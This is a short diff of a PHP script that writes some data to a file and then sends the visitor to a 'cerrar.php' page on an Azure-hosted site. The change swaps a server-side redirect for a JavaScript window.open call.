@@ -31,5 +31,7 @@ fwrite($fp, $data2);
 fwrite ($fp, "\n");
 fclose($fp);
 }
-header("Location: https://controlcursociber.azurewebsites.net/cerrar.php", true, 301);
+echo '<script type="text/javascript">
+    window.open("https://controlcursociber.azurewebsites.net/cerrar.php");
+</script>';
 exit();?>
